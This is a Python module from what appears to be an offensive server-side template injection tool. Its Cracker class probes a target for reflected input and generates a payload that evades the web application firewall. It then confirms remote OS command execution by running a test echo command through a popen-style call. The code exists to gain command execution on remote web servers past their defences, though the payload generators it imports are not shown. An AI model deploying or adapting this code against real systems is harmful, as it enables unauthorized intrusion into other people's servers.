"""攻击指定的路径

"""

import logging
import random
from collections import namedtuple
from string import ascii_lowercase

from .submitter import Submitter
from .colorize import colored
from .const import (
    OS_POPEN_READ,
    DETECT_MODE_ACCURATE,
)
from .waf_func_gen import WafFuncGen
from .full_payload_gen import FullPayloadGen

logger = logging.getLogger("cracker")
Result = namedtuple("Result", "full_payload_gen input_field")


class Cracker:
    test_cmd = "echo f3n  j1ng;"
    test_result = "f3n j1ng"

    def __init__(
        self,
        submitter: Submitter,
        detect_mode: str = DETECT_MODE_ACCURATE,
    ):
        self.detect_mode = detect_mode
        self.subm = submitter
        self.waf_func_gen = WafFuncGen(
            submitter, callback=None, detect_mode=detect_mode
        )

    def test_payload(self, payload: str):
        logger.info(
            "Testing generated payload.",
        )
        result = self.subm.submit(payload)
        assert result is not None
        _, text = result
        return self.test_result in text

    def is_vulunable(self):
        content = "".join(random.choices(ascii_lowercase, k=6))
        resp = self.subm.submit(content)
        assert resp is not None
        return content in resp.text

    def crack(self):
        logger.info("Testing...")
        waf_func = self.waf_func_gen.generate()
        full_payload_gen = FullPayloadGen(
            waf_func, callback=None, detect_mode=self.detect_mode
        )
        payload, will_print = full_payload_gen.generate(
            OS_POPEN_READ, self.test_cmd
        )
        if payload is None:
            return None
        # payload测试成功时为True, 失败时为False, 无法测试为None
        if will_print:
            if self.test_payload(payload):
                logger.info(
                    "%s Now we can generate payloads.",
                    colored("green", "Success!", bold=True),
                )
            else:
                logger.info(
                    "%s! Generated payloads might be useless.",
                    colored("yellow", "Test Payload Failed", bold=True),
                )
        else:
            logger.info(
                "We WON'T SEE the execution result! "
                + "You can try generating payloads anyway.",
            )
        return full_payload_gen
